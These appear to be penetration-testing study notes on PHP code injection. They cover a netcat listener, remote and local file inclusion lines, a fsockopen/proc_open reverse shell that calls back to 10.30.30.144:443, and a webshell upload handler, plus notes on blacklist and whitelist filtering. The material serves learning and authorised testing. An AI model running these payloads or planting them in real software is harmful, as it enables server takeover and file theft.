## 2. Reverse Shell Access (Netcat)

> A **reverse shell** allows an attacker or tester to get remote shell access from a target system back to their own machine.

## Using Netcat for Reverse Shell:
> Run on Kali Linux terminal
```bash
nc -nlvp 443
```

* `-n` : numeric-only IP addresses (no DNS resolution)
* `-l` : listen mode
* `-v` : verbose output
* `-p 443` : listening port (change as needed)

> This sets up a listener on your machine. The target system connects back to this listener when executing a reverse shell payload.

# 2. PHP Dangerous Functions & Exploitation Payloads

## 1. `escapeshellcmd`

* **Description:** Escapes special characters in a command string before passing it to the shell.
* **Use:** Mitigates command injection when using `exec()`, `system()`, or `shell_exec()`.
* **Risk:** Partial protection only — unsafe logic can still be exploited.

## 2. `include` / `require`

* **Description:** Includes and executes external PHP files.
* **Risks:**

  * **LFI (Local File Inclusion):** Include local sensitive files (e.g., `/etc/passwd`).
  * **RFI (Remote File Inclusion):** Include malicious remote scripts.

**Examples:**

```php
// LFI
include('/etc/passwd');
require('/etc/passwd');

// RFI
include('http://10.30.30.144/php-reverse-shell.php');
require('http://10.30.30.144/php-reverse-shell.php');
```

## 3. `file_put_contents`

* **Description:** Writes data into a file (creates/overwrites).
* **Risk:** Attackers can drop backdoors or overwrite critical files.

**Example:**

```php
$code = '<?php phpinfo(); ?>'; 
file_put_contents("phpinfo-test.php", $code);
```

## 4. `file_get_contents`

* **Description:** Reads file or URL content into a string.
* **Risk:** Disclosure of sensitive files / fetch attacker’s code.

**Example:**

```php
$content = file_get_contents("/etc/passwd"); 
echo nl2br(htmlspecialchars($content));
```

## 5. `eval`

* **Description:** Executes a string as PHP code.
* **Risk:** Direct RCE (Remote Code Execution).

**Example:**

```php
$code = 'echo "Hello, World!";'; 
eval($code);
```

## 6. `fsockopen` + `proc_open` + `file_put_contents`

* **Description:** Opens reverse TCP connection, spawns shell.
* **Risk:** Full RCE.

**Example:**

```php
$ip = '10.30.30.144';
$port = 443;
$code = "<?php set_time_limit(0);
$sock = fsockopen('$ip', $port);
$proc = proc_open('/bin/sh', [0=>$sock, 1=>$sock, 2=>$sock], $pipes); ?>";
file_put_contents("reverse-shell.php", $code);
```

## 7. `fopen` (Malicious File Upload via Write)

* **Description:** Create upload handler → arbitrary uploads.
* **Risk:** Upload webshells / malicious scripts.

**Example:**

```php
$file = fopen("upload2.php","w");
fwrite($file, '
<html>
<form action="upload2.php" method="post" enctype="multipart/form-data">
Select File: <input type="file" name="fileToUpload">
<input type="submit" value="Upload" name="submit">
</form>
<?php
if(isset($_POST["submit"])) {
    $file_name = $_FILES["fileToUpload"]["name"];
    $file_tmp = $_FILES["fileToUpload"]["tmp_name"];
    if (move_uploaded_file($file_tmp, "./".$file_name)) { echo "OK"; }
} ?>'); 
fclose($file);
```

### 📊 Summary Table

| **Function / Payload**                    | **Description**         | **Risk**                       |
| ----------------------------------------- | ----------------------- | ------------------------------ |
| `escapeshellcmd`                          | Escapes shell commands  | Partial protection             |
| `include` / `require`                     | Includes PHP files      | LFI / RFI → RCE, disclosure    |
| `file_put_contents`                       | Writes data to file     | Drop backdoors / overwrite     |
| `file_get_contents`                       | Reads file/URL content  | Info disclosure / remote fetch |
| `eval`                                    | Executes string as code | Critical RCE                   |
| Reverse shell via `fsockopen + proc_open` | TCP reverse shell       | Remote takeover                |
| `fopen` upload handler                    | Malicious file uploads  | Arbitrary webshell             |

## Things to keep in mind

### 1. Admin Functionality

* Code Injection usually appears in **admin-level features**, not normal user inputs.

### 2. Black Box Pentest

* **No source code** provided.
* Tester works like an outsider, guessing via inputs & outputs.

### 3. White Box Pentest

* **Full source code + architecture** given.
* Deep vulnerability analysis possible.

### 4. Blacklist Filtering

* Blocks specific **dangerous functions/characters** (e.g., `system`, `exec`, `;`, `<script>`).
* Weak security → can be bypassed.
* Regex style: `preg_match()`

### 5. Whitelist Filtering

* Allows only **safe/defined inputs** (e.g., `[a-zA-Z0-9]`).
* Strong security → but inconvenient for clients.
* Regex style: `!preg_match()`

---

### 🔑 Blacklist vs Whitelist (Quick Table)

| Aspect        | Blacklist 🚫      | Whitelist ✅           |
| ------------- | ----------------- | --------------------- |
| Method        | Block some items  | Allow only safe items |
| Security      | Weak (bypassable) | Strong (strict)       |
| Developer use | More common       | Less common           |
| Regex style   | `preg_match()`    | `!preg_match()`       |
